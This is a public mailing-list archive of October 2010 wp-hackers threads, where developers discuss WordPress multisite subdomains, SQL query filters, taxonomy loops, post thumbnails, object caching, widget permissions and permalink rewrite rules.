In-Reply-To: <AANLkTin8KEAcmoMrid2-Q1-zTC9Tg0N=b7jPqzXOog3n@mail.gmail.com>
References: <AANLkTimAY5rwBGqmZsmdbr7BF+FA+QHiOSGnaAVGeBuP@mail.gmail.com>
	<AANLkTim3DKzkuxyjBJYa3dY6oxrBCVRWZQvu904JUG+y@mail.gmail.com>
	<40018148-A080-4F21-A7D8-5F0EFA1B1711@medienhaus.at>
	<AANLkTinSpZ367=HtAwi5wp7+P_m+zPaJEtcYPwjis4ZF@mail.gmail.com>
	<AANLkTikBF27QuL+Jya3ozqtbYUTfkPqYLi-=nQvzpKM8@mail.gmail.com>
	<AANLkTimrssvs4LHdbPFFK0mexNSOt82UDJuq6SnDcMOi@mail.gmail.com>
	<AANLkTinG1Vw3FFCfVGbz=UTQuonU2K9qw=CaoWQTWX+z@mail.gmail.com>
	<A8051D18-0D79-472C-8520-8C3A81AA675C@ftwr.co.uk>
	<AANLkTin8KEAcmoMrid2-Q1-zTC9Tg0N=b7jPqzXOog3n@mail.gmail.com>
Message-ID: <AANLkTimA87fRbdo-owYH_58MXPZondgVOKm6EipzqK6W@mail.gmail.com>

I did find a filter posts_request, which affects the query to get a post,
then I just str_replace() the sql to replace wp_(blog id)_posts with
wp_(posts).  Works perfect but it only affects the query used when viewing a
single post.  If I can find other filters like this that deal with getting
the posts I might be able to make this work without switch_to_blog.


On Wed, Oct 20, 2010 at 12:29 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:

> I do have a plugin on my main blog that is supposed to detect mobile
> user-agents or the use of the m.mysite.com domain and switch to a mobile
> theme.  I'm just not sure how I can make m.mysite.com access mysite.comwithout redircting it, thus loosing the m subdomain that would kick in the
> mobile theme.
>
>
> On Wed, Oct 20, 2010 at 4:25 AM, Peter Westwood <peter.westwood at ftwr.co.uk
> > wrote:
>
>>
>> On 20 Oct 2010, at 11:56, Alex Hempton-Smith wrote:
>>
>> > I've tried this before and it's difficult with multi-site set up.
>> >
>> > I guess the question is, how do we 'jump in' before WordPress serves up
>> the
>> > registration page at m.example.com and instead serve up example.comwith a
>> > different theme?
>> >
>> > Because, once we set up subdomain wildcards, WP is running the show
>> then?
>> >
>> >
>>
>> I guess the answer would be to put some code in sunrise.php to make WP
>> believe that the current blog is the one you want it to in this case and
>> make it use the right theme
>>
>> Cheers
>> --
>> Peter Westwood
>> http://blog.ftwr.co.uk | http://westi.wordpress.com
>> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>

From mail at scribu.net  Thu Oct 21 01:16:11 2010
From: mail at scribu.net (scribu)
Date: Thu, 21 Oct 2010 04:16:11 +0300
Subject: [wp-hackers] Filtering a loop by a custom taxonomy term
	assignment
In-Reply-To: <AANLkTimHgMh8zwg0OrN-dUfmyN+6BY95EFPF_FzwFHEa@mail.gmail.com>
References: <AANLkTinORFVzOzXpvPypOy+p1wQ59Dw1q_MfHfTnQ-+O@mail.gmail.com>
	<AANLkTi=rGb4Gm8ayBq+AXv8aia2Uj+BsnEJ1poWavFB8@mail.gmail.com>
	<AANLkTikLmhB+nRns2WyajsTVANtZSke8XXspoYp0QeGn@mail.gmail.com>
	<AANLkTi=1icK9oumRS_11drLzqak+uU71-jp+afeQDfRP@mail.gmail.com>
	<AANLkTimHgMh8zwg0OrN-dUfmyN+6BY95EFPF_FzwFHEa@mail.gmail.com>
Message-ID: <AANLkTik_j0UpPw3zmZw3+Ne4h1T27g1qzexy_D56uq63@mail.gmail.com>

The way you register the taxonomy is also important. I now realize that this
discussion would be more appropriate in the support forums:

http://wordpress.org/support/forum/how-to-and-troubleshooting


On Thu, Oct 21, 2010 at 3:57 AM, David Morris <dvmorris at gmail.com> wrote:

> That doesn't seem to work for me.
>
> On Wed, Oct 20, 2010 at 7:46 PM, scribu <mail at scribu.net> wrote:
>
> > On Thu, Oct 21, 2010 at 3:31 AM, David Morris <dvmorris at gmail.com>
> wrote:
> >
> > > //in functions.php
> > >
> > > add_action( 'pre_get_posts', 'test_pre_get_posts' );
> > > function test_pre_get_posts( $query ) {
> > > $query->set('taxonomy','test');
> > >  $query->set('term','test_term');
> > >  return $query;
> > > }
> > >
> >
> > Try this instead:
> >
> > function test_pre_get_posts( $query ) {
> >   $query->set('test', 'test_term');
> > }
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
>
> --
> Dave Morris
> http://dave.showviz.net/
> http://3dcamphouston.com/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From dvmorris at gmail.com  Thu Oct 21 01:32:19 2010
From: dvmorris at gmail.com (David Morris)
Date: Wed, 20 Oct 2010 20:32:19 -0500
Subject: [wp-hackers] Filtering a loop by a custom taxonomy term
	assignment
In-Reply-To: <AANLkTik_j0UpPw3zmZw3+Ne4h1T27g1qzexy_D56uq63@mail.gmail.com>
References: <AANLkTinORFVzOzXpvPypOy+p1wQ59Dw1q_MfHfTnQ-+O@mail.gmail.com>
	<AANLkTi=rGb4Gm8ayBq+AXv8aia2Uj+BsnEJ1poWavFB8@mail.gmail.com>
	<AANLkTikLmhB+nRns2WyajsTVANtZSke8XXspoYp0QeGn@mail.gmail.com>
	<AANLkTi=1icK9oumRS_11drLzqak+uU71-jp+afeQDfRP@mail.gmail.com>
	<AANLkTimHgMh8zwg0OrN-dUfmyN+6BY95EFPF_FzwFHEa@mail.gmail.com>
	<AANLkTik_j0UpPw3zmZw3+Ne4h1T27g1qzexy_D56uq63@mail.gmail.com>
Message-ID: <AANLkTik_tWNP3=W7OzXQ3KkJa2abO=xnMZ1YRhOSdv52@mail.gmail.com>

http://wordpress.org/support/topic/filtering-a-loop-by-a-custom-taxonomy-term-assignment?replies=1#post-1749685

On Wed, Oct 20, 2010 at 8:16 PM, scribu <mail at scribu.net> wrote:

> The way you register the taxonomy is also important. I now realize that
> this
> discussion would be more appropriate in the support forums:
>
> http://wordpress.org/support/forum/how-to-and-troubleshooting
>
>
> On Thu, Oct 21, 2010 at 3:57 AM, David Morris <dvmorris at gmail.com> wrote:
>
> > That doesn't seem to work for me.
> >
> > On Wed, Oct 20, 2010 at 7:46 PM, scribu <mail at scribu.net> wrote:
> >
> > > On Thu, Oct 21, 2010 at 3:31 AM, David Morris <dvmorris at gmail.com>
> > wrote:
> > >
> > > > //in functions.php
> > > >
> > > > add_action( 'pre_get_posts', 'test_pre_get_posts' );
> > > > function test_pre_get_posts( $query ) {
> > > > $query->set('taxonomy','test');
> > > >  $query->set('term','test_term');
> > > >  return $query;
> > > > }
> > > >
> > >
> > > Try this instead:
> > >
> > > function test_pre_get_posts( $query ) {
> > >   $query->set('test', 'test_term');
> > > }
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> >
> >
> >
> > --
> > Dave Morris
> > http://dave.showviz.net/
> > http://3dcamphouston.com/
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Dave Morris
http://dave.showviz.net/
http://3dcamphouston.com/

From rbilesky at gmail.com  Thu Oct 21 01:33:54 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Wed, 20 Oct 2010 18:33:54 -0700
Subject: [wp-hackers] Multisite w/ Subdomain issues
In-Reply-To: <AANLkTimA87fRbdo-owYH_58MXPZondgVOKm6EipzqK6W@mail.gmail.com>
References: <AANLkTimAY5rwBGqmZsmdbr7BF+FA+QHiOSGnaAVGeBuP@mail.gmail.com>
	<AANLkTim3DKzkuxyjBJYa3dY6oxrBCVRWZQvu904JUG+y@mail.gmail.com>
	<40018148-A080-4F21-A7D8-5F0EFA1B1711@medienhaus.at>
	<AANLkTinSpZ367=HtAwi5wp7+P_m+zPaJEtcYPwjis4ZF@mail.gmail.com>
	<AANLkTikBF27QuL+Jya3ozqtbYUTfkPqYLi-=nQvzpKM8@mail.gmail.com>
	<AANLkTimrssvs4LHdbPFFK0mexNSOt82UDJuq6SnDcMOi@mail.gmail.com>
	<AANLkTinG1Vw3FFCfVGbz=UTQuonU2K9qw=CaoWQTWX+z@mail.gmail.com>
	<A8051D18-0D79-472C-8520-8C3A81AA675C@ftwr.co.uk>
	<AANLkTin8KEAcmoMrid2-Q1-zTC9Tg0N=b7jPqzXOog3n@mail.gmail.com>
	<AANLkTimA87fRbdo-owYH_58MXPZondgVOKm6EipzqK6W@mail.gmail.com>
Message-ID: <AANLkTi=ULoi8U9SmoPDe1es9P8EqyNdKeODjQ-GAVYLX@mail.gmail.com>

Actually I can do one better, there is a generic sql filter called query
using that I am replacing wp_3_table with wp_table for posts, postmeta,
comments, commentmeta.

On Wed, Oct 20, 2010 at 6:12 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:

> I did find a filter posts_request, which affects the query to get a post,
> then I just str_replace() the sql to replace wp_(blog id)_posts with
> wp_(posts).  Works perfect but it only affects the query used when viewing a
> single post.  If I can find other filters like this that deal with getting
> the posts I might be able to make this work without switch_to_blog.
>
>
> On Wed, Oct 20, 2010 at 12:29 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
>
>> I do have a plugin on my main blog that is supposed to detect mobile
>> user-agents or the use of the m.mysite.com domain and switch to a mobile
>> theme.  I'm just not sure how I can make m.mysite.com access mysite.comwithout redircting it, thus loosing the m subdomain that would kick in the
>> mobile theme.
>>
>>
>> On Wed, Oct 20, 2010 at 4:25 AM, Peter Westwood <
>> peter.westwood at ftwr.co.uk> wrote:
>>
>>>
>>> On 20 Oct 2010, at 11:56, Alex Hempton-Smith wrote:
>>>
>>> > I've tried this before and it's difficult with multi-site set up.
>>> >
>>> > I guess the question is, how do we 'jump in' before WordPress serves up
>>> the
>>> > registration page at m.example.com and instead serve up example.comwith a
>>> > different theme?
>>> >
>>> > Because, once we set up subdomain wildcards, WP is running the show
>>> then?
>>> >
>>> >
>>>
>>> I guess the answer would be to put some code in sunrise.php to make WP
>>> believe that the current blog is the one you want it to in this case and
>>> make it use the right theme
>>>
>>> Cheers
>>> --
>>> Peter Westwood
>>> http://blog.ftwr.co.uk | http://westi.wordpress.com
>>> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
>>>
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>
>>
>

From rbilesky at gmail.com  Thu Oct 21 02:19:41 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Wed, 20 Oct 2010 19:19:41 -0700
Subject: [wp-hackers] Multisite w/ Subdomain issues
In-Reply-To: <AANLkTi=ULoi8U9SmoPDe1es9P8EqyNdKeODjQ-GAVYLX@mail.gmail.com>
References: <AANLkTimAY5rwBGqmZsmdbr7BF+FA+QHiOSGnaAVGeBuP@mail.gmail.com>
	<AANLkTim3DKzkuxyjBJYa3dY6oxrBCVRWZQvu904JUG+y@mail.gmail.com>
	<40018148-A080-4F21-A7D8-5F0EFA1B1711@medienhaus.at>
	<AANLkTinSpZ367=HtAwi5wp7+P_m+zPaJEtcYPwjis4ZF@mail.gmail.com>
	<AANLkTikBF27QuL+Jya3ozqtbYUTfkPqYLi-=nQvzpKM8@mail.gmail.com>
	<AANLkTimrssvs4LHdbPFFK0mexNSOt82UDJuq6SnDcMOi@mail.gmail.com>
	<AANLkTinG1Vw3FFCfVGbz=UTQuonU2K9qw=CaoWQTWX+z@mail.gmail.com>
	<A8051D18-0D79-472C-8520-8C3A81AA675C@ftwr.co.uk>
	<AANLkTin8KEAcmoMrid2-Q1-zTC9Tg0N=b7jPqzXOog3n@mail.gmail.com>
	<AANLkTimA87fRbdo-owYH_58MXPZondgVOKm6EipzqK6W@mail.gmail.com>
	<AANLkTi=ULoi8U9SmoPDe1es9P8EqyNdKeODjQ-GAVYLX@mail.gmail.com>
Message-ID: <AANLkTinKZa7v5Fm3cmyU7GzmzLwf8LD73DMdE5oBzcDf@mail.gmail.com>

This has caused 1 minor problem.  Posts work fine, pages don't it appears
thats because my site is setup with verbose page rewrite rules, so I just
need to modify the page rewrite rules to match that of the main site.

On Wed, Oct 20, 2010 at 6:33 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:

> Actually I can do one better, there is a generic sql filter called query
> using that I am replacing wp_3_table with wp_table for posts, postmeta,
> comments, commentmeta.
>
>
> On Wed, Oct 20, 2010 at 6:12 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
>
>> I did find a filter posts_request, which affects the query to get a post,
>> then I just str_replace() the sql to replace wp_(blog id)_posts with
>> wp_(posts).  Works perfect but it only affects the query used when viewing a
>> single post.  If I can find other filters like this that deal with getting
>> the posts I might be able to make this work without switch_to_blog.
>>
>>
>> On Wed, Oct 20, 2010 at 12:29 PM, Ryan Bilesky <rbilesky at gmail.com>wrote:
>>
>>> I do have a plugin on my main blog that is supposed to detect mobile
>>> user-agents or the use of the m.mysite.com domain and switch to a mobile
>>> theme.  I'm just not sure how I can make m.mysite.com access mysite.comwithout redircting it, thus loosing the m subdomain that would kick in the
>>> mobile theme.
>>>
>>>
>>> On Wed, Oct 20, 2010 at 4:25 AM, Peter Westwood <
>>> peter.westwood at ftwr.co.uk> wrote:
>>>
>>>>
>>>> On 20 Oct 2010, at 11:56, Alex Hempton-Smith wrote:
>>>>
>>>> > I've tried this before and it's difficult with multi-site set up.
>>>> >
>>>> > I guess the question is, how do we 'jump in' before WordPress serves
>>>> up the
>>>> > registration page at m.example.com and instead serve up example.comwith a
>>>> > different theme?
>>>> >
>>>> > Because, once we set up subdomain wildcards, WP is running the show
>>>> then?
>>>> >
>>>> >
>>>>
>>>> I guess the answer would be to put some code in sunrise.php to make WP
>>>> believe that the current blog is the one you want it to in this case and
>>>> make it use the right theme
>>>>
>>>> Cheers
>>>> --
>>>> Peter Westwood
>>>> http://blog.ftwr.co.uk | http://westi.wordpress.com
>>>> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
>>>>
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>
>>>
>>>
>>
>

From chris at 314media.com  Thu Oct 21 04:39:51 2010
From: chris at 314media.com (Chris Carter)
Date: Wed, 20 Oct 2010 23:39:51 -0500
Subject: [wp-hackers] the_post_thumbnail();
Message-ID: <AANLkTimGaTjxejYsCWnyET7hwT7dfOgmaPqsgJ=TLLS2@mail.gmail.com>

Anyone successful from removing the title attribute from
the_post_thumbnail()?  I'm stumped...


-- 
Chris

From chris at 314media.com  Thu Oct 21 04:58:43 2010
From: chris at 314media.com (Chris Carter)
Date: Wed, 20 Oct 2010 23:58:43 -0500
Subject: [wp-hackers] the_post_thumbnail();
In-Reply-To: <AANLkTimGaTjxejYsCWnyET7hwT7dfOgmaPqsgJ=TLLS2@mail.gmail.com>
References: <AANLkTimGaTjxejYsCWnyET7hwT7dfOgmaPqsgJ=TLLS2@mail.gmail.com>
Message-ID: <AANLkTi=vnXbKgUyfOUr2B_=0gHOa7gpWyhZ++c5g=SDU@mail.gmail.com>

Sorry;

This array works:

 the_post_thumbnail(array( 150,150 ), array( 'alt' => 'alttext', 'title' =>
'titletext'));

It does bump the image down 50 px from where it's supposed to be though...
Had to do a 'style' => 'margin-top: -50px' for some reason...

On Wed, Oct 20, 2010 at 11:39 PM, Chris Carter <chris at 314media.com> wrote:

> Anyone successful from removing the title attribute from
> the_post_thumbnail()?  I'm stumped...
>
>
> --
> Chris
>



-- 
Chris

From johnbillion+wp at gmail.com  Thu Oct 21 10:25:26 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Thu, 21 Oct 2010 11:25:26 +0100
Subject: [wp-hackers] Handling non_persistent_groups in a persistent object
	cache
Message-ID: <AANLkTi=eQAaDRf_wxsryRdhzVtG1ajFBPWubNZS2C2WM@mail.gmail.com>

Hi,

I've written a persistent object cache plugin (the object-cache.php
drop-in) which interfaces with Xcache.

In WordPress, some cache groups get added to a list of non persistent
groups using add_non_persistent_groups(). Am I right in thinking that
any object placed into the cache that's in one of these groups should
not be stored persistently (ie. should not be stored in Xcache) and
only be cached in a PHP variable for the duration of the page just
like WordPress' built-in object cache? Or does this mean something
else?

Any pointers appreciated.

Cheers,
John

From mail at scribu.net  Thu Oct 21 10:35:12 2010
From: mail at scribu.net (scribu)
Date: Thu, 21 Oct 2010 13:35:12 +0300
Subject: [wp-hackers] Handling non_persistent_groups in a persistent
 object cache
In-Reply-To: <AANLkTi=eQAaDRf_wxsryRdhzVtG1ajFBPWubNZS2C2WM@mail.gmail.com>
References: <AANLkTi=eQAaDRf_wxsryRdhzVtG1ajFBPWubNZS2C2WM@mail.gmail.com>
Message-ID: <AANLkTi=gsqYx_ha4rdfT7fXnPj2kWaFAB=b-L4U51m7r@mail.gmail.com>

On Thu, Oct 21, 2010 at 1:25 PM, John Blackbourn
<johnbillion+wp at gmail.com<johnbillion%2Bwp at gmail.com>
> wrote:

> Hi,
>
> I've written a persistent object cache plugin (the object-cache.php
> drop-in) which interfaces with Xcache.
>
> In WordPress, some cache groups get added to a list of non persistent
> groups using add_non_persistent_groups(). Am I right in thinking that
> any object placed into the cache that's in one of these groups should
> not be stored persistently (ie. should not be stored in Xcache) and
> only be cached in a PHP variable for the duration of the page just
> like WordPress' built-in object cache? Or does this mean something
> else?
>
> Any pointers appreciated.
>

I think your best bet is to look at the implementation for memcache:

http://wordpress.org/extend/plugins/memcached/

From johnbillion+wp at gmail.com  Thu Oct 21 11:34:16 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Thu, 21 Oct 2010 12:34:16 +0100
Subject: [wp-hackers] Handling non_persistent_groups in a persistent
 object cache
In-Reply-To: <AANLkTi=gsqYx_ha4rdfT7fXnPj2kWaFAB=b-L4U51m7r@mail.gmail.com>
References: <AANLkTi=eQAaDRf_wxsryRdhzVtG1ajFBPWubNZS2C2WM@mail.gmail.com>
	<AANLkTi=gsqYx_ha4rdfT7fXnPj2kWaFAB=b-L4U51m7r@mail.gmail.com>
Message-ID: <AANLkTik-=D3cqRsCCfJsXpyxP5ShA1dKS27C4pDXB2Fi@mail.gmail.com>

On Thu, Oct 21, 2010 at 11:35 AM, scribu <mail at scribu.net> wrote:
> I think your best bet is to look at the implementation for memcache:
>
> http://wordpress.org/extend/plugins/memcached/

Looking at that memcache implementation, that should indeed be the
behaviour for the non persistent groups. Thanks for the link.

John

From emoya at tribune.com  Thu Oct 21 15:58:36 2010
From: emoya at tribune.com (Moya, Eddie)
Date: Thu, 21 Oct 2010 10:58:36 -0500
Subject: [wp-hackers] Programmatic Widget Handling
In-Reply-To: <C8E4B235.CE9D%emoya@tribune.com>
Message-ID: <C8E5CD5C.CF32%emoya@tribune.com>


I'd like to add to what I said yesterday that, the point of the whole discussion is not the features of the plugin I am building, rather that there is a lot of missing functionality for widgets, from an API perspective as well as from an end-user admin-panel perspective. In some cases the need for admin-panel functionality can be remedied by a plugin, but first we need an underlying widget api robust enough to give developers that flexibility.

Also, my previous explanation about how I managed to limit the appearance of a widget to a specific sidebar through various CSS hacks, was meant to illustrate the existing difficulty of doing something that really should be fairly simple. It was _NOT_ meant as a suggested permanent solution.  That's "NOT", with a capital "N.O."

Just wanted to clear that up, since I got a response from some one thinking I meant the CSS hack should be implemented into wp somehow.

--
Eddie Moya
Applications Developer
Tribune Technology



On 10/20/10 2:50 PM, "Eddie Moya" <emoya at tribune.com> wrote:



On 10/20/10 2:06 PM, "Jeremy Clarke" <jer at simianuprising.com> wrote:

> I might have been confused because that is something that is easy to do with
> the existing api:

Thing is, as I said, what I have is basically a really simple api, what is needed is an interface. So that this can b done without needing to write a new custom_widgets_init each time, and without hardcoding widget names. Of course, since what I have does not have a GUI yet, yes it basically mimics part of what your describing. The intent has always been to add an interface to this though that has no hard-coded widget names.



> If someone can edit a sidebar then having widgets that they can't edit will
> mean there are parts of the sidebar that they can't change. This seems
> pretty user-unfriendly to me, and I don't even want to start thinking
> through all the logic you'd need to handle to make it work well.

Agreed, the logical mayhem I ran into just trying to come up with a plan of action for this is the reason I "scrapped it" as I said before. Still, it seems that some way of limiting access to a widgets based on users capabilities would be a very valuable addition. The way this might be handled or accomplished is obviously up in the air. Nonetheless, its not a leap of crazy logic to say that it would be useful to have users with ABC capability be able to edit Sidebar_X, but not have access to Some_Important_Widget, while still giving that access to certain other users.

As far as it not being user-friendly, that all depends on presentation of course and making sure there isnt unexpected background behavior going on. I envision a locked widget might just be permanently collapsed, undraggable, and have a little padlock on it to indicate its been locked. Easier said than done though.



> I'd tend to think that you should instead limit Widgets/Sidebars access to those you can
> trust with the content of the sidebar.

Are you saying there is a way to do this already? If not an alternative to the aforementioned - this would be a great feature  of its own. Something like this combined with what I listed as #2 - the ability to add contraints to a widget in terms of which sidebars it can/cant be used with - might together solve some of what is needed for #3. However, this would not be ideal, since it would leave the entire affair dependant on the number of sidebars built into a theme - rather than just giving admins the ability to control access to widgets directly.


--
Eddie Moya
Applications Developer
Tribune Technology



_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



From rbilesky at gmail.com  Thu Oct 21 19:16:27 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Thu, 21 Oct 2010 12:16:27 -0700
Subject: [wp-hackers] Permalink Performance
In-Reply-To: <AANLkTi=8mGe=27ftFpb-d9pC+as9zvvAh6sJ0OQ0AxPB@mail.gmail.com>
References: <AANLkTi=8mGe=27ftFpb-d9pC+as9zvvAh6sJ0OQ0AxPB@mail.gmail.com>
Message-ID: <AANLkTimhTX=W+=MkrpVzcRL8ojNVXL1emGyHpJTYf=zj@mail.gmail.com>

I made an interesting discovery today, I use a permalink of /blog/%postname%

Now while having another rewrite rules issue I install this plugin (
http://wordpress.org/extend/plugins/askapaches-rewriterules-viewer/)
according to it, my blog is using verbose page rewrite rules.

Now performance wise this isn;t much of an issue as I won;t have probabbly
more than 50 pages or so, but this is causing another issue when I modify
the sql queries of one blog to pull posts, pages, and comments from another
blog on my multisite install.  see my other recent email about my subdomin
probllems with multisite.  I am using the query filter to change wp_#_table
to wp_table and everything works find, except pages, unless I copy the pages
to that sites table to create the rewrite rules.

Anyway just though I'd update this with my findings about using a static
string to start post permalinks.

On Thu, Sep 2, 2010 at 10:45 AM, Ryan Bilesky <rbilesky at gmail.com> wrote:

> According to http://codex.wordpress.org/Using_Permalinks
>
> Permalinks for posts should start with some sort of number.
>
> "For performance reasons, it is *not* a good idea to start your permalink
> structure with the category, tag, author, or postname fields. The reason is
> that these are text fields, and using them at the beginning of your
> permalink structure it takes more time for WordPress to distinguish your
> Post URLs from Page URLs (which always use the text "page slug" as the URL),
> and to compensate, WordPress stores a lot of extra information in its
> database (so much that sites with lots of Pages have experienced
> difficulties). So, it is best to start your permalink structure with a
> numeric field, such as the year or post ID."
>
> Now my question is this, I would like to have my permalinks for posts look
> like this:   mysite.tld/blog/%postname%
>
> Does anyone know if this will cause any performance issues since they start
> with a static string?
>

From rbilesky at gmail.com  Thu Oct 21 19:19:45 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Thu, 21 Oct 2010 12:19:45 -0700
Subject: [wp-hackers] Multisite w/ Subdomain issues
In-Reply-To: <AANLkTinKZa7v5Fm3cmyU7GzmzLwf8LD73DMdE5oBzcDf@mail.gmail.com>
References: <AANLkTimAY5rwBGqmZsmdbr7BF+FA+QHiOSGnaAVGeBuP@mail.gmail.com>
	<AANLkTim3DKzkuxyjBJYa3dY6oxrBCVRWZQvu904JUG+y@mail.gmail.com>
	<40018148-A080-4F21-A7D8-5F0EFA1B1711@medienhaus.at>
	<AANLkTinSpZ367=HtAwi5wp7+P_m+zPaJEtcYPwjis4ZF@mail.gmail.com>
	<AANLkTikBF27QuL+Jya3ozqtbYUTfkPqYLi-=nQvzpKM8@mail.gmail.com>
	<AANLkTimrssvs4LHdbPFFK0mexNSOt82UDJuq6SnDcMOi@mail.gmail.com>
	<AANLkTinG1Vw3FFCfVGbz=UTQuonU2K9qw=CaoWQTWX+z@mail.gmail.com>
	<A8051D18-0D79-472C-8520-8C3A81AA675C@ftwr.co.uk>
	<AANLkTin8KEAcmoMrid2-Q1-zTC9Tg0N=b7jPqzXOog3n@mail.gmail.com>
	<AANLkTimA87fRbdo-owYH_58MXPZondgVOKm6EipzqK6W@mail.gmail.com>
	<AANLkTi=ULoi8U9SmoPDe1es9P8EqyNdKeODjQ-GAVYLX@mail.gmail.com>
	<AANLkTinKZa7v5Fm3cmyU7GzmzLwf8LD73DMdE5oBzcDf@mail.gmail.com>
Message-ID: <AANLkTimgA1_eQCYZYBfvwRwMCTe3DxcHsSB9HFRcN6Yz@mail.gmail.com>

I have found this is caused by page rewrite rules, they are verbose.  I am
planning to work around this by dulplicating pages into the mobile site's
posts table (without content to kee pthe size down) this will cause the
necessary rewrite rules to be added to the site to get it to actually show
the page and the content from my main blogs table will be what is shown.
I discovered this because my about page works, since an about page is
created with the new blog.  And a plugin that shows my rewrite rules shows
me I am using verbose page rewrite rules.

On Wed, Oct 20, 2010 at 7:19 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:

> This has caused 1 minor problem.  Posts work fine, pages don't it appears
> thats because my site is setup with verbose page rewrite rules, so I just
> need to modify the page rewrite rules to match that of the main site.
>
>
> On Wed, Oct 20, 2010 at 6:33 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
>
>> Actually I can do one better, there is a generic sql filter called query
>> using that I am replacing wp_3_table with wp_table for posts, postmeta,
>> comments, commentmeta.
>>
>>
>> On Wed, Oct 20, 2010 at 6:12 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
>>
>>> I did find a filter posts_request, which affects the query to get a post,
>>> then I just str_replace() the sql to replace wp_(blog id)_posts with
>>> wp_(posts).  Works perfect but it only affects the query used when viewing a
>>> single post.  If I can find other filters like this that deal with getting
>>> the posts I might be able to make this work without switch_to_blog.
>>>
>>>
>>> On Wed, Oct 20, 2010 at 12:29 PM, Ryan Bilesky <rbilesky at gmail.com>wrote:
>>>
>>>> I do have a plugin on my main blog that is supposed to detect mobile
>>>> user-agents or the use of the m.mysite.com domain and switch to a
>>>> mobile theme.  I'm just not sure how I can make m.mysite.com access
>>>> mysite.com without redircting it, thus loosing the m subdomain that
>>>> would kick in the mobile theme.
>>>>
>>>>
>>>> On Wed, Oct 20, 2010 at 4:25 AM, Peter Westwood <
>>>> peter.westwood at ftwr.co.uk> wrote:
>>>>
>>>>>
>>>>> On 20 Oct 2010, at 11:56, Alex Hempton-Smith wrote:
>>>>>
>>>>> > I've tried this before and it's difficult with multi-site set up.
>>>>> >
>>>>> > I guess the question is, how do we 'jump in' before WordPress serves
>>>>> up the
>>>>> > registration page at m.example.com and instead serve up example.comwith a
>>>>> > different theme?
>>>>> >
>>>>> > Because, once we set up subdomain wildcards, WP is running the show
>>>>> then?
>>>>> >
>>>>> >
>>>>>
>>>>> I guess the answer would be to put some code in sunrise.php to make WP
>>>>> believe that the current blog is the one you want it to in this case and
>>>>> make it use the right theme
>>>>>
>>>>> Cheers
>>>>> --
>>>>> Peter Westwood
>>>>> http://blog.ftwr.co.uk | http://westi.wordpress.com
>>>>> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
>>>>>
>>>>> _______________________________________________
>>>>> wp-hackers mailing list
>>>>> wp-hackers at lists.automattic.com
>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>>
>>>>
>>>>
>>>
>>
>

From otto at ottodestruct.com  Thu Oct 21 19:27:07 2010
From: otto at ottodestruct.com (Otto)
Date: Thu, 21 Oct 2010 14:27:07 -0500
Subject: [wp-hackers] Permalink Performance
In-Reply-To: <AANLkTimhTX=W+=MkrpVzcRL8ojNVXL1emGyHpJTYf=zj@mail.gmail.com>
References: <AANLkTi=8mGe=27ftFpb-d9pC+as9zvvAh6sJ0OQ0AxPB@mail.gmail.com>
	<AANLkTimhTX=W+=MkrpVzcRL8ojNVXL1emGyHpJTYf=zj@mail.gmail.com>
Message-ID: <AANLkTik2Z_HKBQJhkoRDPC_-qFAufGZ-pxyJRxe_rdfS@mail.gmail.com>

Looking at the code, I see that I have been mistaken on this point for
some time now. Static strings at the front of the permalink string do
not disable verbose page rules. Although I don't know why it's doing
that, since static strings should be fine to avoid the problem.

I'll have to investigate the rewrite system some more.

-Otto



On Thu, Oct 21, 2010 at 2:16 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
> I made an interesting discovery today, I use a permalink of /blog/%postname%
>
> Now while having another rewrite rules issue I install this plugin (
> http://wordpress.org/extend/plugins/askapaches-rewriterules-viewer/)
> according to it, my blog is using verbose page rewrite rules.
>
> Now performance wise this isn;t much of an issue as I won;t have probabbly
> more than 50 pages or so, but this is causing another issue when I modify
> the sql queries of one blog to pull posts, pages, and comments from another
> blog on my multisite install. ?see my other recent email about my subdomin
> probllems with multisite. ?I am using the query filter to change wp_#_table
> to wp_table and everything works find, except pages, unless I copy the pages
> to that sites table to create the rewrite rules.
>
> Anyway just though I'd update this with my findings about using a static
> string to start post permalinks.
>
> On Thu, Sep 2, 2010 at 10:45 AM, Ryan Bilesky <rbilesky at gmail.com> wrote:
>
